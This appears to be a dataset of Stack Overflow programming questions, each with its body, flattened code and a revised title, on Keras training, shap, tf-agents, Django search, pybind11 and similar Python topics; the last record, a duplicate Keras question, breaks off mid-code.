Keras Loss Decreases But Accuracy Stays The Same," I am training a normal feed-forward network on financial data of the last 90 days of a stock, and I am predicting whether the stock will go up or down on the next day. I am using binary cross entropy as my loss and standard SGD for the optimizer. When I train, the training and validation loss continue to go down as they should, but the accuracy and validation accuracy stay around the same.Here's my model: I expect that either both losses should decrease while both accuracies increase, or the network will overfit and the validation loss and accuracy won't change much. Either way, shouldn't the loss and its corresponding accuracy value be directly linked and move inversely to each other?Also, I notice that my validation loss is always less than my normal loss, which seems wrong to me.Here's the loss (Normal: Blue, Validation: Green)Here's the accuracy (Normal: Black, Validation: Yellow): <code>  _________________________________________________________________Layer (type) Output Shape Param #=================================================================dense (Dense) (None, 90, 256) 1536_________________________________________________________________elu (ELU) (None, 90, 256) 0_________________________________________________________________flatten (Flatten) (None, 23040) 0_________________________________________________________________dropout (Dropout) (None, 23040) 0_________________________________________________________________dense_1 (Dense) (None, 1024) 23593984_________________________________________________________________elu_1 (ELU) (None, 1024) 0_________________________________________________________________dropout_1 (Dropout) (None, 1024) 0_________________________________________________________________dense_2 (Dense) (None, 512) 524800_________________________________________________________________elu_2 (ELU) (None, 512) 0_________________________________________________________________dropout_2 (Dropout) (None, 512) 0_________________________________________________________________dense_3 (Dense) (None, 512) 262656_________________________________________________________________elu_3 (ELU) (None, 512) 0_________________________________________________________________dropout_3 (Dropout) (None, 512) 0_________________________________________________________________dense_4 (Dense) (None, 256) 131328_________________________________________________________________activation (Activation) (None, 256) 0_________________________________________________________________dense_5 (Dense) (None, 2) 514_________________________________________________________________activation_1 (Activation) (None, 2) 0_________________________________________________________________Total params: 24,514,818Trainable params: 24,514,818Non-trainable params: 0_________________________________________________________________",Why would the loss decrease while the accuracy stays the same?
Getting shap values instead of a chart," I used shap to determine the feature importance for multiple regression with correlated features. shap offers a chart to get the shap values. Is there also a statistic available? I am interested in the exact shap values. I read the Github repository and the documentation but I found nothing regarding this topic.  <code>  import numpy as npimport pandas as pd from sklearn.linear_model import LinearRegressionfrom sklearn.datasets import load_bostonimport shapboston = load_boston()regr = pd.DataFrame(boston.data)regr.columns = boston.feature_namesregr['MEDV'] = boston.targetX = regr.drop('MEDV', axis = 1)Y = regr['MEDV']fit = LinearRegression().fit(X, Y)explainer = shap.LinearExplainer(fit, X, feature_dependence = 'independent')# I used 'independent' because the result is consistent with the ordinary # shapely values where `correlated' is notshap_values = explainer.shap_values(X)shap.summary_plot(shap_values, X, plot_type = 'bar')",Shap statistics
Loaded tf-agents policy - can't manually construct timeStep," I am trying to load a tf-agents policy I saved via Quick explanation for the try/except block: When originally creating the policy, I can save it via PolicySaver, but when I load it again for another training run, it is a SavedModel and can therefore not be saved by PolicySaver.This seems to work fine, but now I want to use this policy for self-play, so I load the policy with self.policy = tf.saved_model.load(policy_path) in my AIPlayer class. When I try to use it for prediction, however, it does not work. Here's the (testing) code: the table passed into the function contains the state of the game and the ts.restart() function is copied from my custom pyEnvironment, so the timestep is constructed the exact same way as it would be in the environment. However, I get the following error message for the line prediction=self.policy.action(timestep): What am I doing wrong? Is it really just the tensor names or are the shapes the problem and how can I change that?Any ideas how to further debug this are appreciated. <code>  try: PolicySaver(collect_policy).save(model_dir + 'collect_policy')except TypeError: tf.saved_model.save(collect_policy, model_dir + 'collect_policy') def decide(self, table): state = table.getState() timestep = ts.restart(np.array([table.getState()], dtype=np.float)) prediction = self.policy.action(timestep) print(prediction) ValueError: Could not find matching function to call loaded from the SavedModel. Got: Positional arguments (2 total): * TimeStep(step_type=<tf.Tensor 'time_step:0' shape=() dtype=int32>, reward=<tf.Tensor 'time_step_1:0' shape=() dtype=float32>, discount=<tf.Tensor 'time_step_2:0' shape=() dtype=float32>, observation=<tf.Tensor 'time_step_3:0' shape=(1, 79) dtype=float64>) * () Keyword arguments: {}Expected these arguments to match one of the following 2 option(s):Option 1: Positional arguments (2 total): * TimeStep(step_type=TensorSpec(shape=(None,), dtype=tf.int32, name='time_step/step_type'), reward=TensorSpec(shape=(None,), dtype=tf.float32, name='time_step/reward'), discount=TensorSpec(shape=(None,), dtype=tf.float32, name='time_step/discount'), observation=TensorSpec(shape=(None,79), dtype=tf.float64, name='time_step/observation')) * () Keyword arguments: {}Option 2: Positional arguments (2 total): * TimeStep(step_type=TensorSpec(shape=(None,), dtype=tf.int32, name='step_type'), reward=TensorSpec(shape=(None,), dtype=tf.float32, name='reward'), discount=TensorSpec(shape=(None,), dtype=tf.float32, name='discount'), observation=TensorSpec(shape=(None, 79), dtype=tf.float64, name='observation')) * () Keyword arguments: {}",ValueError: Could not find matching function to call loaded from the SavedModel
Ingore specific logging line temporarily," I have a method called import_customers() which loads csv-like data.This methods logs to log-level INFO.In one case I want to avoid this logging.I see several ways: Variant 1: a new kwarg like do_logging=True which I can switch to false.Variant 2: Use some magic context which ignores this line. How could I implement IgnoreLoggingContext()?If you think V1 is better, then please leave a comment. <code>  with IgnoreLoggingContext() as context: import_customers()",Ignore specific logging line temporarily
Is pipenv slow?," I tried switching from venv & conda to pipenv to manage my virtual environments, but one thing I noticed about pipenv that it's oddly slow when it's doing ""Locking"" and it gets to the point where it stops executing for ""Running out of time"". Is it usually this slow or is it just me? Also, could you give me some advice regarding how to make it faster? <code> ",Is Python's pipenv slow?
Implement the function Fast Modular Exponentiation," I am trying to implement the function fast modular exponentiation(b, k, m) which computes: b(2k) mod m using only around 2k modular multiplications.I tried this method: but I am still stuck in same problem which is if I try b = 2, k = 1, m = 10, my code returns 22. However, the correct answer is: 2^(2^1) mod 10 = 2^2 mod 10 = 4and I cannot find the reason why. <code>  def FastModularExponentiation(b, k, m): res = 1 b = b % m while (k > 0): if ((k & 1) == 1): res = (res * b) % m k = k >> 1 b = (b * b) % m return res",Implement the function fast modular exponentiation
Python: explicitely use default arguments," Under normal circumstances one calls a function with its default arguments by omitting those arguments. However if I'm generating arguments on the fly, omitting one isn't always easy or elegant. Is there a way to use a function's default argument explicitly? That is, to pass an argument which points back to the default argument.So something like this except with ~use default~ replaced with something intelligent. I don't know if it's even possible and given the term ""default argument"" all my searches come up with is coders first tutorial. If this functionality is not supported that's ok too, I'd just like to know. <code>  def function(arg='default'): print(arg)arg_list= ['not_default', ~use default~ ]for arg in arg_list: function(arg=arg)# output:# not_default# default",Python: explicitly use default arguments
Get rotational shift using phase correlation and log polar | python opencv," I have been working on a script which calculates the rotational shift between two images using cv2's phaseCorrelate method.I have two images, the second is a 90 degree rotated version of the first image. After loading in the images, I convert them to log-polar before passing them into the phaseCorrelate function. From what I have read, I believe that this should yield a rotational shift between two images. The code below describes the implementation. I am unsure how to interpret the results of this function. The expected outcome is a value similar to 90 degrees, however, I get the value below. How can I make the output correct? <code>  #bitwise right binary shift functiondef rshift(val, n): return (val % 0x100000000)base_img = cv2.imread('img1.jpg')cur_img = cv2.imread('dataa//t_sv_1.jpg')curr_img = rotateImage(cur_img, 90)rows,cols,chan = base_img.shapex, y, c = curr_img.shape#convert images to valid typeref32 = np.float32(cv2.cvtColor(base_img, cv2.COLOR_BGR2GRAY))curr32 = np.float32(cv2.cvtColor(curr_img, cv2.COLOR_BGR2GRAY))value = np.sqrt(((rows/2.0)**2.0)+((cols/2.0)**2.0))value2 = np.sqrt(((x/2.0)**2.0)+((y/2.0)**2.0))polar_image = cv2.linearPolar(ref32,(rows/2, cols/2), value, cv2.WARP_FILL_OUTLIERS)log_img = cv2.linearPolar(curr32,(x/2, y/2), value2, cv2.WARP_FILL_OUTLIERS) shift = cv2.phaseCorrelate(polar_image, log_img)sx = shift[0][0]sy = shift[0][1]sf = shift[1]polar_image = polar_image.astype(np.uint8)log_img = log_img.astype(np.uint8)cv2.imshow(""Polar Image"", polar_image)cv2.imshow('polar', log_img)#get rotation from shift along y axisrotation = sy * 180 / (rshift(y, 1));print(rotation) cv2.waitKey(0)cv2.destroyAllWindows() Output: -0.00717516014538333",Get rotational shift using phase correlation and log polar transform
Python C API: Embedding Python in C/C++," For my senior project in Computer Science, I am making a puzzle video game that will teach people how to code in Python. The largest portion of the design involves creating engaging puzzles that the user can sort through. The puzzle design isn't the issue I have currently, however.While my initial idea was to have each ""problem"" have an array of expected answers to check the user's answer against, the CS department head at my school (who runs the senior seminar) recommended I use embedded Python instead, he recommend both to challenge me, and to make it easier on the data to embed a simple interpreter that will check user code output against the expected output. Fast-forward four weeks, and I've learned a lot about how Python actually works. I even got the interpreter to simple C strings as python code, things like print(""hello"") or print(""hello/tworld""), so long as there is no white space in the C string. That code looks like My next step I decided was to get strings like print(""hello world"") white space included, readable as Python code.I have tried to change the exec code function to look like This compiles fine when the function is changed like this, but when I input any string, simple or with white space, the program exits with a return value of 0 with out printing any of the python code. I am curious why this is occurring, whether I'm having issues converting the user input to an adequate C string to read as a Python code, or it is not understanding the declaration of Py_CompileString(const char *str, const char *filename, int start) or PyRun_String(const char *str, int start, PyObject *globals, PyObject *locals), I have stared at this documentation, taken notes, diagrammed, and I still get the same exit condition.I'm also wondering: If I'm declaring the dictionary for the Python string commands to read the code properly, or if it's If by having my Python file flags set to NULL in the simplified version instead of Py_CompileStrngFlags(...) or Py_RunStringFlags(...) that it's what's causing the return value of NULL issue I'm experiencing.If I'm even using the right function to run embedded Python with user input. <code>  #include ""pch.h""#include <iostream>#include <string>#include <fstream>#include <Python.h>void exec_pycode(const char* code);int main(){ using namespace std; Py_Initialize(); string input; cin >> input; /*Though the variable gets passed to a const char* definition, the pointer is constant over the character, because the pointer ALWAYS points to the same function*/ char const *PyCode = input.data(); exec_pycode(PyCode); Py_Finalize(); return EXIT_SUCCESS; } //The execution of python code as a simple string in C and interpreting in pythonvoid exec_pycode(const char* code){ Py_Initialize(); PyRun_SimpleString(code); Py_Finalize();} void exec_pycode(const char* code){ Py_Initialize(); const char *inFile = ""FileName""; PyObject *dict = PyDict_New(); Py_CompileString(code, inFile, Py_file_input); PyRun_String(code, Py_file_input, dict, dict); Py_Finalize();}",Embedding Python in C/C++
How to convert numpy arrays to shapely polygons?," I am using CV2 to find contours from an image and then converting them into polygons using Shapely. I am currently stuck because when I try putting one of the contour arrays into Polygon() from Shapely it throws an unspecified error. I have double-checked that I imported everything I needed, and that creating a Shapely polygon works when I manually enter the array coordinate points. Here is the problematic section of the code: Where the list of contours looks like this: The error I get is: <code>  contours, hierarchy = cv2.findContours(thresh, cv2.RETR_CCOMP, cv2.CHAIN_APPROX_SIMPLE)testcontour = contours[1]ply = Polygon(testcontour) contours = [np.array([[[700, 700]], [[700, 899]], [[899, 899]], [[899, 700]]]), np.array([[[774, 775]], [[775, 774]], [[824, 774]], [[825, 775]], [[825, 824]], [[824, 825]], [[775, 825]], [[774, 824]]]), np.array([[[200, 200]], [[200, 399]], [[399, 399]], [[399, 200]]]), np.array([[[274, 275]], [[275, 274]], [[324, 274]], [[325, 275]], [[325, 324]], [[324, 325]], [[275, 325]], [[274, 324]]])] ---------------------------------------------------------------------------AssertionError Traceback (most recent call last)<ipython-input-65-4124f49b42e1> in <module>----> 1 ply = Polygon(testcontour)~\AppData\Local\Continuum\anaconda3\envs\geocomp\lib\site-packages\shapely\geometry\polygon.py in __init__(self, shell, holes) 238 239 if shell is not None:--> 240 ret = geos_polygon_from_py(shell, holes) 241 if ret is not None: 242 self._geom, self._ndim = ret~\AppData\Local\Continuum\anaconda3\envs\geocomp\lib\site-packages\shapely\geometry\polygon.py in geos_polygon_from_py(shell, holes) 492 493 if shell is not None:--> 494 ret = geos_linearring_from_py(shell) 495 if ret is None: 496 return None~\AppData\Local\Continuum\anaconda3\envs\geocomp\lib\site-packages\shapely\speedups\_speedups.pyx in shapely.speedups._speedups.geos_linearring_from_py()AssertionError: ",How to convert NumPy arrays obtained from cv2.findContours to Shapely polygons?
Django ORM: How can I sort by date and then select the best of the objects within a foreign key?," I realize my title is kind of complex, but please allow me to demonstrate. I'm on Django 2.2.5 with Python 3. Here are the models I'm currently working with: (There's some stuff in these models I've cut for brevity and what I believe is irrelevance, but if it becomes important later on, I'll add it in.)In English, I'm working with an app that represents the data in an email listserv. Basically, there's a Thread that contains multiple Post objects; people reply-all to the initial post and create a discussion. I've just finished implementing a search capability using the built-in support Django offers for full-text search in Django. It's super fast, and I love it. Here's an example of me searching in views.py: This is all fine and dandy and returns search results that definitely make sense. But I've just encountered a situation I'm not quite sure how to handle. The displayed results just aren't quite as clean as I'd like. What this query gets me is all Post objects that match the user-provided query. That's fine, but there may be many Post objects within the same Thread that clog up the results. It might be something like this: (Here, rank is the relevance returned by Django's SearchRank method.)What I really want is this: I want to display the most representative matching Post for each Thread, sorted by descending timestamp. In other words, for each Thread containing a Post in the search results, only the highest rank Post should be displayed, and those highest rank Post objects should be sorted by timestamp in descending order. So in the above example, these are the results I'd like to see: It would be fairly straightforward to do what I want to do with a few for loops, but I'm really hoping there's a way to accomplish this purely in the ORM for efficiency. Do any of you guys have any suggestions? Please let me know if you need me to clarify anything about the problem setup or what I want. <code>  from django.db import modelsfrom django.db.models import Ffrom django.contrib.postgres.indexes import GinIndexfrom django.contrib.postgres.search import SearchVectorField, SearchVector, SearchQuery, SearchRankclass Thread(models.Model): title = models.CharField(max_length=100) last_update = models.DateTimeField(auto_now=True)class PostQuerySet(models.QuerySet): _search_vector = SearchVector('thread__type') + \ SearchVector('thread__title') + \ SearchVector('from_name') + \ SearchVector('from_email') + \ SearchVector('message') ### # There's code here that updates the `Post.search_vector` field for each `Post` object # using `PostQuerySet._search_vector`. ### def search(self, text): """""" Search posts using the indexed `search_vector` field. I can, for example, call `Post.objects.search('influenza h1n1')`. """""" search_query = SearchQuery(text) search_rank = SearchRank(F('search_vector'), search_query) return self.annotate(rank=search_rank).filter(search_vector=search_query).order_by('-rank')class Post(models.Model): thread = models.ForeignKey(Thread, on_delete=models.CASCADE) timestamp = models.DateTimeField() from_name = models.CharField(max_length=100) from_email = models.EmailField() message = models.TextField() in_response_to = models.ManyToManyField('self', symmetrical=False, blank=True) search_vector = SearchVectorField(null=True) objects = PostQuerySet().as_manager() class Meta: ordering = ['timestamp'] indexes = [ GinIndex(fields=['search_vector']) ] #### Pull `query` from a form defined in `forms.py`.###search_results = Post.objects.search(query).order_by('-timestamp') post5 from thread2 - timestamp 2018-04-01, rank 0.5post1 from thread3 - timestamp 2018-03-01, rank 0.25post3 from thread2 - timestamp 2018-02-01, rank 0.75post3 from thread1 - timestamp 2018-01-01, rank 0.6post2 from thread1 - timestamp 2017-12-01, rank 0.7post2 from thread2 - timestamp 2017-11-01, rank 0.7 post1 from thread3 - timestamp 2018-03-01, rank 0.25post3 from thread2 - timestamp 2018-02-01, rank 0.75post2 from thread1 - timestamp 2017-12-01, rank 0.7",Django ORM: How can I sort by date and then select the best of the objects grouped by a foreign key?
Read CSV with json feature in Pandas," I am trying to read a large CSV which includes JSON features (location here). For the first, say 100 lines, the file looks like this: I followed this question to parse the location column. The solution basically defines a helper as: and then I get the following error which is related to JSON format: Q1: How can I parse the feature location onto new columns?Q2 (for general case): For nrows>100 in the data, also the last features (labelA and labelB) have JSON formats with different key and value. How can I possibly read the entire CSV with parsing every feature which includes JSON (even partially)? <code>  Time,location,labelA,labelB2019-09-10,{""lng"":12.9,""alt"":413.0,""time"":""2019-09-10"",""error"":7.0,""lat"":17.8},nan,nan def CustomParser(data): import json j1 = json.loads(data) return j1 df=pd.read_csv('data.csv', nrows=100,converters={'location':CustomParser},header=0) JSONDecodeError: Expecting value: line 1 column 1 (char 0)",Read CSV with JSON feature
returning multiple std::vectors without copying in pybind11," I am trying to build a python module in C++ using pybind11. I have the following code: When I call this code in python: This works, however when I check the memory usage of the program (using psutil.Process(os.getpid()).memory_info().rss) it seems to make a copy when I call the functions getInts, getDoubles and getDoubles2. Is there a way to avoid this?I have tried using np.array(container.getInts(), copy=False), but it still makes a copy. Also I tried using the py::buffer_protocol() on the Container class as mentioned here: https://pybind11.readthedocs.io/en/stable/advanced/pycpp/numpy.html . However I can only make that work for either the Ints vector or the Doubles vectors and not for all at the same time. Then I can use i = np.array(container, copy=False), without a copy being made. However as I said it only works for the Ints vector now. <code>  #include <pybind11/pybind11.h>#include <pybind11/stl.h>#include <pybind11/numpy.h>namespace py = pybind11;struct ContainerElement{ uint8_t i; double d; double d2;};class Container{private: std::vector<uint8_t> ints; std::vector<double> doubles; std::vector<double> doubles2;public: std::vector<uint8_t>& getInts() { return ints; } std::vector<double>& getDoubles() { return doubles; } std::vector<double>& getDoubles2() { return doubles2; } void addElement(ContainerElement element) { ints.emplace_back(element.i); doubles.emplace_back(element.d); doubles2.emplace_back(element.d2); }};void fillContainer(Container& container){ for (int i = 0; i < 1e6; ++i) { container.addElement({(uint8_t)i, (double)i,(double)i }); }}PYBIND11_MODULE(containerInterface, m) { py::class_<Container>(m, ""Container"") .def(py::init<>()) .def(""getInts"", [](Container& container) { return py::array_t<uint8_t>( { container.getInts().size() }, { sizeof(uint8_t) }, container.getInts().data()); }) .def(""getDoubles"", [](Container& container) { return py::array_t<double>( { container.getDoubles().size() }, { sizeof(double) }, container.getDoubles().data()); }) .def(""getDoubles2"", [](Container& container) { return py::array_t<double>( { container.getDoubles2().size() }, { sizeof(double) }, container.getDoubles2().data()); }); m.def(""fillContainer"", &fillContainer);} import containerInterfacecontainer = containerInterface.Container()containerInterface.fillContainer(container)i = container.getInts()d = container.getDoubles()d2 = container.getDoubles2() PYBIND11_MODULE(containerInterface, m) { py::class_<Container>(m, ""Container"", py::buffer_protocol()) .def(py::init<>()) .def(""getInts"", &Container::getInts) .def(""getDoubles"", &Container::getDoubles) .def_buffer([](Container& container) -> py::buffer_info { return py::buffer_info( container.getInts().data(), sizeof(uint8_t), py::format_descriptor<uint8_t>::format(), 1, { container.getInts().size() }, { sizeof(uint8_t) * container.getInts().size() } ); });m.def(""fillContainer"", &fillContainer);",returning multiple py::array without copying in pybind11
Python weird Type warning," Why does the following code: tell me this?Unexpected type(s):(int, int)Possible types:(int, None)(slice, Iterable[None])... <code>  v = [None for _ in range(3)]v[-1] = 0 <<<",PyCharm weird Type warning
Iterate through dictionary with duplicate keys," I have a dictionary I want to be able to iterate through the dictionary and get a list of all the values and their keys. However, when I try to do it, it only gets the first symbol key value pair and ignores the other one. <code>  params = ImmutableMultiDict([('dataStore', 'tardis'), ('symbol', '1'), ('symbol', '2')]) for k in params: print(params.get(k))",Iterate over keys and all values in MultiDict
Sum numbers in a list-," I need to sum all the numbers in the list. If 0 occurs start subtracting, until another 0, start adding. For example: This is what I've tried: <code>  [1, 2, 0, 3, 0, 4] -> 1 + 2 - 3 + 4 = 4[0, 2, 1, 0, 1, 0, 2] -> -2 - 1 + 1 - 2 = -4[1, 2] -> 1 + 2 = 3[4, 0, 2, 3] = 4 - 2 - 3 = -1 sss = 0for num in numbers: if 0 == num: sss = -num else: sss += numreturn sss",Sum numbers in a list but change their sign after zero is encountered
Keras model cannot decrease loss on toy data," I propose a example in which a tf.keras model fails to learn from very simple data. I'm using tensorflow-gpu==2.0.0, keras==2.3.0 and Python 3.7. At the end of my post, I give the Python code to reproduce the problem I observed.DataThe samples are Numpy arrays of shape (6, 16, 16, 16, 3). To make things very simple, I only consider arrays full of 1s and 0s. Arrays with 1s are given the label 1 and arrays with 0s are given the label 0. I can generate some samples (in the following, n_samples = 240) with this code: In order to input this data in a tf.keras model, I create an instance of tf.data.Dataset using the code below. This will essentially create shuffled batches of BATCH_SIZE = 12 samples. ModelI propose the following model to classify my samples: The model is optimized using Adam (with default parameters) and with the binary_crossentropy loss: The output of clf_model.summary() is: TrainingThe model is trained for 500 epochs as follows: The problem! During the 500 epochs, the model loss stays around 0.69 and never goes below 0.69. This is also true if I set the learning rate to 1e-2 instead of 1e-3. The data is very simple (just 0s and 1s). Naively, I would expect the model to have a better accuracy than just 0.6. In fact, I would expect it to reach 100% accuracy quickly. What I am doing wrong?The full code... <code>  def generate_fake_data(): for j in range(1, 240 + 1): if j < 120: yield np.ones((6, 16, 16, 16, 3)), np.array([0., 1.]) else: yield np.zeros((6, 16, 16, 16, 3)), np.array([1., 0.]) def make_tfdataset(for_training=True): dataset = tf.data.Dataset.from_generator(generator=lambda: generate_fake_data(), output_types=(tf.float32, tf.float32), output_shapes=(tf.TensorShape([6, 16, 16, 16, 3]), tf.TensorShape([2]))) dataset = dataset.repeat() if for_training: dataset = dataset.shuffle(buffer_size=1000) dataset = dataset.batch(BATCH_SIZE) dataset = dataset.prefetch(tf.data.experimental.AUTOTUNE) return dataset def create_model(in_shape=(6, 16, 16, 16, 3)): input_layer = Input(shape=in_shape) reshaped_input = Lambda(lambda x: K.reshape(x, (-1, *in_shape[1:])))(input_layer) conv3d_layer = Conv3D(filters=64, kernel_size=8, strides=(2, 2, 2), padding='same')(reshaped_input) relu_layer_1 = ReLU()(conv3d_layer) pooling_layer = GlobalAveragePooling3D()(relu_layer_1) reshape_layer_1 = Lambda(lambda x: K.reshape(x, (-1, in_shape[0] * 64)))(pooling_layer) expand_dims_layer = Lambda(lambda x: K.expand_dims(x, 1))(reshape_layer_1) conv1d_layer = Conv1D(filters=1, kernel_size=1)(expand_dims_layer) relu_layer_2 = ReLU()(conv1d_layer) reshape_layer_2 = Lambda(lambda x: K.squeeze(x, 1))(relu_layer_2) out = Dense(units=2, activation='softmax')(reshape_layer_2) return Model(inputs=[input_layer], outputs=[out]) clf_model = create_model()clf_model.compile(optimizer=Adam(), loss='categorical_crossentropy', metrics=['accuracy', 'categorical_crossentropy']) Model: ""model""_________________________________________________________________Layer (type) Output Shape Param # =================================================================input_1 (InputLayer) [(None, 6, 16, 16, 16, 3) 0 _________________________________________________________________lambda (Lambda) (None, 16, 16, 16, 3) 0 _________________________________________________________________conv3d (Conv3D) (None, 8, 8, 8, 64) 98368 _________________________________________________________________re_lu (ReLU) (None, 8, 8, 8, 64) 0 _________________________________________________________________global_average_pooling3d (Gl (None, 64) 0 _________________________________________________________________lambda_1 (Lambda) (None, 384) 0 _________________________________________________________________lambda_2 (Lambda) (None, 1, 384) 0 _________________________________________________________________conv1d (Conv1D) (None, 1, 1) 385 _________________________________________________________________re_lu_1 (ReLU) (None, 1, 1) 0 _________________________________________________________________lambda_3 (Lambda) (None, 1) 0 _________________________________________________________________dense (Dense) (None, 2) 4 =================================================================Total params: 98,757Trainable params: 98,757Non-trainable params: 0 train_ds = make_tfdataset(for_training=True)history = clf_model.fit(train_ds, epochs=500, steps_per_epoch=ceil(240 / BATCH_SIZE), verbose=1) import numpy as npimport tensorflow as tfimport tensorflow.keras.backend as Kfrom math import ceilfrom tensorflow.keras.layers import Input, Dense, Lambda, Conv1D, GlobalAveragePooling3D, Conv3D, ReLUfrom tensorflow.keras.models import Modelfrom tensorflow.keras.optimizers import AdamBATCH_SIZE = 12def generate_fake_data(): for j in range(1, 240 + 1): if j < 120: yield np.ones((6, 16, 16, 16, 3)), np.array([0., 1.]) else: yield np.zeros((6, 16, 16, 16, 3)), np.array([1., 0.])def make_tfdataset(for_training=True): dataset = tf.data.Dataset.from_generator(generator=lambda: generate_fake_data(), output_types=(tf.float32, tf.float32), output_shapes=(tf.TensorShape([6, 16, 16, 16, 3]), tf.TensorShape([2]))) dataset = dataset.repeat() if for_training: dataset = dataset.shuffle(buffer_size=1000) dataset = dataset.batch(BATCH_SIZE) dataset = dataset.prefetch(tf.data.experimental.AUTOTUNE) return datasetdef create_model(in_shape=(6, 16, 16, 16, 3)): input_layer = Input(shape=in_shape) reshaped_input = Lambda(lambda x: K.reshape(x, (-1, *in_shape[1:])))(input_layer) conv3d_layer = Conv3D(filters=64, kernel_size=8, strides=(2, 2, 2), padding='same')(reshaped_input) relu_layer_1 = ReLU()(conv3d_layer) pooling_layer = GlobalAveragePooling3D()(relu_layer_1) reshape_layer_1 = Lambda(lambda x: K.reshape(x, (-1, in_shape[0] * 64)))(pooling_layer) expand_dims_layer = Lambda(lambda x: K.expand_dims(x, 1))(reshape_layer_1) conv1d_layer = Conv1D(filters=1, kernel_size=1)(expand_dims_layer) relu_layer_2 = ReLU()(conv1d_layer) reshape_layer_2 = Lambda(lambda x: K.squeeze(x, 1))(relu_layer_2) out = Dense(units=2, activation='softmax')(reshape_layer_2) return Model(inputs=[input_layer], outputs=[out])train_ds = make_tfdataset(for_training=True)clf_model = create_model(in_shape=(6, 16, 16, 16, 3))clf_model.summary()clf_model.compile(optimizer=Adam(lr=1e-3), loss='categorical_crossentropy', metrics=['accuracy', 'categorical_crossentropy'])history = clf_model.fit(train_ds, epochs=500, steps_per_epoch=ceil(240 / BATCH_SIZE), verbose=1)",Keras model fails to decrease loss
Keras model will not decrease loss on toy data," I propose a example in which a tf.keras model fails to learn from very simple data. I'm using tensorflow-gpu==2.0.0, keras==2.3.0 and Python 3.7. At the end of my post, I give the Python code to reproduce the problem I observed.DataThe samples are Numpy arrays of shape (6, 16, 16, 16, 3). To make things very simple, I only consider arrays full of 1s and 0s. Arrays with 1s are given the label 1 and arrays with 0s are given the label 0. I can generate some samples (in the following, n_samples = 240) with this code: In order to input this data in a tf.keras model, I create an instance of tf.data.Dataset using the code below. This will essentially create shuffled batches of BATCH_SIZE = 12 samples. ModelI propose the following model to classify my samples: The model is optimized using Adam (with default parameters) and with the binary_crossentropy loss: The output of clf_model.summary() is: TrainingThe model is trained for 500 epochs as follows: The problem! During the 500 epochs, the model loss stays around 0.69 and never goes below 0.69. This is also true if I set the learning rate to 1e-2 instead of 1e-3. The data is very simple (just 0s and 1s). Naively, I would expect the model to have a better accuracy than just 0.6. In fact, I would expect it to reach 100% accuracy quickly. What I am doing wrong?The full code... <code>  def generate_fake_data(): for j in range(1, 240 + 1): if j < 120: yield np.ones((6, 16, 16, 16, 3)), np.array([0., 1.]) else: yield np.zeros((6, 16, 16, 16, 3)), np.array([1., 0.]) def make_tfdataset(for_training=True): dataset = tf.data.Dataset.from_generator(generator=lambda: generate_fake_data(), output_types=(tf.float32, tf.float32), output_shapes=(tf.TensorShape([6, 16, 16, 16, 3]), tf.TensorShape([2]))) dataset = dataset.repeat() if for_training: dataset = dataset.shuffle(buffer_size=1000) dataset = dataset.batch(BATCH_SIZE) dataset = dataset.prefetch(tf.data.experimental.AUTOTUNE) return dataset def create_model(in_shape=(6, 16, 16, 16, 3)): input_layer = Input(shape=in_shape) reshaped_input = Lambda(lambda x: K.reshape(x, (-1, *in_shape[1:])))(input_layer) conv3d_layer = Conv3D(filters=64, kernel_size=8, strides=(2, 2, 2), padding='same')(reshaped_input) relu_layer_1 = ReLU()(conv3d_layer) pooling_layer = GlobalAveragePooling3D()(relu_layer_1) reshape_layer_1 = Lambda(lambda x: K.reshape(x, (-1, in_shape[0] * 64)))(pooling_layer) expand_dims_layer = Lambda(lambda x: K.expand_dims(x, 1))(reshape_layer_1) conv1d_layer = Conv1D(filters=1, kernel_size=1)(expand_dims_layer) relu_layer_2 = ReLU()(conv1d_layer) reshape_layer_2 = Lambda(lambda x: K.squeeze(x, 1))(relu_layer_2) out = Dense(units=2, activation='softmax')(reshape_layer_2) return Model(inputs=[input_layer], outputs=[out]) clf_model = create_model()clf_model.compile(optimizer=Adam(), loss='categorical_crossentropy', metrics=['accuracy', 'categorical_crossentropy']) Model: ""model""_________________________________________________________________Layer (type) Output Shape Param # =================================================================input_1 (InputLayer) [(None, 6, 16, 16, 16, 3) 0 _________________________________________________________________lambda (Lambda) (None, 16, 16, 16, 3) 0 _________________________________________________________________conv3d (Conv3D) (None, 8, 8, 8, 64) 98368 _________________________________________________________________re_lu (ReLU) (None, 8, 8, 8, 64) 0 _________________________________________________________________global_average_pooling3d (Gl (None, 64) 0 _________________________________________________________________lambda_1 (Lambda) (None, 384) 0 _________________________________________________________________lambda_2 (Lambda) (None, 1, 384) 0 _________________________________________________________________conv1d (Conv1D) (None, 1, 1) 385 _________________________________________________________________re_lu_1 (ReLU) (None, 1, 1) 0 _________________________________________________________________lambda_3 (Lambda) (None, 1) 0 _________________________________________________________________dense (Dense) (None, 2) 4 =================================================================Total params: 98,757Trainable params: 98,757Non-trainable params: 0 train_ds = make_tfdataset(for_training=True)history = clf_model.fit(train_ds, epochs=500, steps_per_epoch=ceil(240 / BATCH_SIZE), verbose=1) import numpy as npimport tensorflow as tfimport tensorflow.keras.backend as Kfrom math import ceilfrom tensorflow.keras.layers import Input, Dense, Lambda, Conv1D, GlobalAveragePooling3D, Conv3D, ReLUfrom tensorflow.keras.models import Modelfrom tensorflow.keras.optimizers import AdamBATCH_SIZE = 12def generate_fake_data(): for j in range(1, 240 + 1): if j < 120: yield np.ones((6, 16, 16, 16, 3)), np.array([0., 1.]) else: yield np.zeros((6, 16, 16, 16, 3)), np.array([1., 0.])def make_tfdataset(for_training=True): dataset = tf.data.Dataset.from_generator(generator=lambda: generate_fake_data(), output_types=(tf.float32, tf.float32), output_shapes=(tf.TensorShape([6, 16, 16, 16, 3]), tf.TensorShape([2]))) dataset = dataset.repeat() if for_training: dataset = dataset.shuffle(buffer_size=1000) dataset = dataset.batch(BATCH_SIZE) dataset = dataset.prefetch(tf.data.experimental.AUTOTUNE) return datasetdef create_model(in_shape=(6, 16, 16, 16, 3)): input_layer = Input(shape=in_shape) reshaped_input = Lambda(lambda x: K.reshape(x, (-1, *in_shape[1:])))(input_layer) conv3d_layer = Conv3D(filters=64, kernel_size=8, strides=(2, 2, 2), padding='same')(reshaped_input) relu_layer_1 = ReLU()(conv3d_layer) pooling_layer = GlobalAveragePooling3D()(relu_layer_1) reshape_layer_1 = Lambda(lambda x: K.reshape(x, (-1, in_shape[0] * 64)))(pooling_layer) expand_dims_layer = Lambda(lambda x: K.expand_dims(x, 1))(reshape_layer_1) conv1d_layer = Conv1D(filters=1, kernel_size=1)(expand_dims_layer) relu_layer_2 = ReLU()(conv1d_layer) reshape_layer_2 = Lambda(lambda x: K.squeeze(x, 1))(relu_layer_2) out = Dense(units=2, 